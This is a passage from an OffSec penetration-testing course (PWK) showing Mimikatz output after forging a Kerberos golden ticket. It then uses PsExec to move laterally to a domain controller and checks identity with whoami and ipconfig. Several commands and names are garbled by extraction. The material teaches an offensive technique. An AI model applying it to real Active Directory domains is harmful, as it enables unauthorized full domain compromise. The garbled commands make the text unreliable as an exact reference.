# OffSec

Penetration Testing with Kali Linux

+   * PAC generated
* PAC signed
* EnTicketPart generated
* EnTicketPart encrypted
* KrCred generated

Golden ticket for 'jen @ corp.com' successfully submitted for current session

mimikatz # miscmd:cmd
Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiCMD' @ 00007FF65F1B8000

Listing 859 - Creating a golden ticket using Mimikatz

Mimikatz provides two sets of defaults when using the golden ticket: the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, with the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Adm group.

With the ticket injected into memory, we launched a new command prompt with **miscmd** when we attempt lateral movement with **PsExec**.

```
C:\Tools\Sysinternals\PsExec.exe \dc1 cmd.exe
```

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russovich
Sysinternals - www.sysinternals.com

```
C:\Windows\system32>ipconfig
```

Windows IP Configuration
Ethernet adapter Ethernet:

```
Connection-specific DNS Suffix 
Local-IPv6 Address . . . . . : fe80::5cd4:aacd:3289%14
IPv4 Address . . . . . . . . . : 192.168.50.70
Subnet Mask . . . . . . . . . : 255.255.255.0
Default Gateway . . . . . . . . . : 192.168.50.254
```

```
C:\Windows\system32>whoami
corp\en
```

```
C:\Windows\system32>whoami /groups
```

GROUP INFORMATION

```
Group Name Type SID
Attributes
===========================================
===========================================
============================================
```

Everyone Well-known group S-1-1-0
Mandatory group, Enabled by default, Enabled group

PWK - © 2023 OffSec Services Limited. All rights reserved.

799